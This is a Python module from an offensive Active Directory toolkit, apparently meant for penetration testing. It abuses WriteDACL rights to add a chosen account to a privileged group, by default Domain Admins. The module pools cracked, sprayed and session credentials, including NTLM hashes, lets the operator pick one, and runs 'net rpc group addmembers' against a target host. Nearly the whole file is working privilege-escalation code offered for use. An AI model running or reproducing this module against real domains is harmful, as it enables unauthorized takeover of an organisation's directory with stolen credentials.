"""
acl_abuse_module.py - ACL / WriteDACL Abuse module for AD-Pathfinder.

Exploits WriteDACL permissions to add a controlled user to a privileged
group using net rpc.

Tools used:
    - net  (part of samba-common-bin: apt install samba-common-bin)

Command (from playbook):
    net rpc group addmembers "<group>" "<user>" -U "<domain>\\<user>%<pass>" -S <target_ip>
"""

from __future__ import annotations

import os
import sys
from typing import Optional

sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from executor import CommandExecutor
from session import AssessmentState

try:
    from rich.console import Console
    from rich.prompt import Prompt
    from rich.table import Table
    from rich import box
    _RICH = True
    console = Console()
except ImportError:
    _RICH = False
    console = None  # type: ignore


# ─────────────────────────────────────────────────────────────────────────────
# ACLAbuseModule
# ─────────────────────────────────────────────────────────────────────────────

class ACLAbuseModule:
    """
    WriteDACL Abuse — add a user to a privileged AD group via net rpc.

    Requirements
    ------------
    - Valid credentials with WriteDACL permission on the target group.
    - 'net' binary from samba-common-bin.

    Command executed:
        net rpc group addmembers "<group>" "<member>" -U "<domain>\\<user>%<pass>" -S <target>
    """

    def __init__(self, executor: Optional[CommandExecutor] = None) -> None:
        self.executor = executor or CommandExecutor(verbose=False)

    def run(self, state: AssessmentState) -> dict:
        """
        Execute WriteDACL group membership abuse.

        Returns
        -------
        dict
            {
                "status":    "success" | "error",
                "group":     str,
                "member":    str,
                "auth_user": str,
                "command":   str,
                "error":     str | None,
                "warnings":  list[str],
            }
        """
        warnings: list[str] = []

        # ── Tool check ────────────────────────────────────────────────────
        if not self.executor.check_tool("net"):
            return self._error(
                "'net' binary not found. Install: sudo apt install samba-common-bin"
            )

        # ── Header ───────────────────────────────────────────────
        console.print()
        console.rule("[bold bright_cyan]ACL Abuse — WriteDACL Group Membership[/bold bright_cyan]")
        console.print()

        # ── Authenticating credential picker ──────────────────────
        _cred_pool: list[tuple[str, str, str]] = []

        def _add(u: str, p: str, src: str) -> None:
            if u and p and not any(c[0] == u and c[1] == p for c in _cred_pool):
                _cred_pool.append((u, p, src))

        for cp in getattr(state, "cracked_passwords", []):
            _add(cp.get("username", ""), cp.get("password", ""), "cracked")
        for vc in getattr(state, "valid_credentials", []):
            _add(vc.get("username", ""), vc.get("password", vc.get("ntlm_hash", "")), "spray")
        ic = state.initial_credentials
        if ic and ic.username:
            _add(ic.username, ic.password or ic.ntlm_hash, "session")

        auth_user = ""
        auth_pass = ""

        if _cred_pool:
            _ct = Table(
                title="[bold bright_cyan]Authenticating Credentials[/bold bright_cyan]",
                box=box.ROUNDED, border_style="bright_blue",
                show_lines=True, expand=False,
            )
            _ct.add_column("#",        style="bold bright_cyan", width=4)
            _ct.add_column("Username", style="bold yellow",       width=26)
            _ct.add_column("Password", style="dim",               width=24)
            _ct.add_column("Source",   style="bright_blue",       width=10)
            for _i, (_u, _p, _s) in enumerate(_cred_pool, 1):
                _pw_d  = f"[bold green]{_p}[/bold green]" if _s == "cracked" else _p
                _src_d = "[bold green]cracked ✔[/bold green]" if _s == "cracked" else f"[bright_blue]{_s}[/bright_blue]"
                _ct.add_row(str(_i), _u, _pw_d, _src_d)
            console.print(_ct)
            console.print()
            _pick = Prompt.ask(
                "  [bold yellow]Select # to authenticate as[/bold yellow] (Enter to type manually)",
                default="", show_default=False,
            ).strip()
            if _pick.isdigit():
                _idx = int(_pick) - 1
                if 0 <= _idx < len(_cred_pool):
                    auth_user, auth_pass, _ = _cred_pool[_idx]
                    console.print(f"  [green]✔  Using: {auth_user}[/green]")
        else:
            console.print("  [dim]No credentials in session — enter manually.[/dim]")
            console.print()

        if not auth_user:
            auth_user = Prompt.ask("  [bold yellow]Username[/bold yellow]", default="").strip()
        if not auth_pass and auth_user:
            auth_pass = Prompt.ask("  [bold yellow]Password[/bold yellow]", default="").strip()

        if not auth_user or not auth_pass:
            return self._error("No authenticating credentials provided.")

        # ── Target group ───────────────────────────────────────────
        console.print()
        _known_groups = getattr(state, "groups", [])
        if _known_groups:
            console.print(
                "  [dim]Discovered groups: [/dim]"
                + "    ".join(f"[yellow]{g}[/yellow]" for g in _known_groups[:8])
                + (f"  [dim]… +{len(_known_groups)-8} more[/dim]" if len(_known_groups) > 8 else "")
            )
            console.print()

        target_group = Prompt.ask(
            "  [bold yellow]Target group[/bold yellow] [dim](e.g. Domain Admins)[/dim]",
            default="Domain Admins",
        ).strip()

        # ── Member to add ─────────────────────────────────────────
        console.print()
        _all_users = sorted(set(
            [c[0] for c in _cred_pool]
            + getattr(state, "users", [])[:12]
        ))
        if _all_users:
            _preview = _all_users[:12]
            _overflow = len(_all_users) - len(_preview)
            console.print(
                "  [dim]Known accounts: [/dim]"
                + "    ".join(f"[yellow]{u}[/yellow]" for u in _preview)
                + (f"  [dim]… +{_overflow} more[/dim]" if _overflow else "")
            )
            console.print()

        member_user = Prompt.ask(
            "  [bold yellow]User to add to that group[/bold yellow]"
        ).strip()

        if not target_group or not member_user:
            return self._error("Target group and member are required.")

        domain = state.domain

        # ── Build exact playbook command ──────────────────────────────────
        # net rpc group addmembers "<group>" "<user>" -U "<domain>\<user>%<pass>" -S <target>
        auth_str = f"{domain}\\{auth_user}%{auth_pass}"
        cmd = [
            "net", "rpc", "group", "addmembers",
            target_group,
            member_user,
            "-U", auth_str,
            "-S", state.target_ip,
        ]

        # Show redacted command to operator
        redacted = (
            f"net rpc group addmembers \"{target_group}\" \"{member_user}\" "
            f"-U \"{domain}\\{auth_user}%****\" -S {state.target_ip}"
        )
        console.print(f"\n  [bold bright_cyan]Running:[/bold bright_cyan] [dim]{redacted}[/dim]\n")

        # ── Confirmation ──────────────────────────────────────────────────
        confirm = Prompt.ask(
            "  [bold red]⚠  This will modify AD group membership. Proceed?[/bold red]",
            choices=["yes", "no"], default="no",
        )
        if confirm != "yes":
            return self._error("Aborted by operator.")

        # ── Execute ───────────────────────────────────────────────────────
        result = self.executor.run(cmd, timeout=30)
        output = result["output"] + "\n" + result["error"]

        if result["status"] == "success" or "Successfully" in output or result["exit_code"] == 0:
            state.log_finding(
                "ACL Abuse",
                f"Added '{member_user}' to group '{target_group}' via WriteDACL "
                f"(auth: {auth_user})",
                severity="CRITICAL",
            )
            state.log_action(f"ACL Abuse: {member_user} → {target_group}")
            return {
                "status":    "success",
                "group":     target_group,
                "member":    member_user,
                "auth_user": auth_user,
                "command":   redacted,
                "error":     None,
                "warnings":  warnings,
            }
        else:
            err_msg = result["error"] or result["output"] or "Unknown error — check permissions."
            if "Access denied" in err_msg or "NT_STATUS_ACCESS_DENIED" in err_msg:
                warnings.append(
                    "Access denied — the authenticating account may not have WriteDACL on this group."
                )
            return {
                "status":    "error",
                "group":     target_group,
                "member":    member_user,
                "auth_user": auth_user,
                "command":   redacted,
                "error":     err_msg.strip(),
                "warnings":  warnings,
            }

    @staticmethod
    def _error(message: str) -> dict:
        return {
            "status":    "error",
            "group":     "",
            "member":    "",
            "auth_user": "",
            "command":   "",
            "error":     message,
            "warnings":  [],
        }


# ─────────────────────────────────────────────────────────────────────────────
# Convenience wrapper
# ─────────────────────────────────────────────────────────────────────────────

def run(state: AssessmentState, executor: Optional[CommandExecutor] = None) -> dict:
    """
    from modules.acl_abuse_module import run as acl_run
    result = acl_run(state)
    """
    return ACLAbuseModule(executor).run(state)
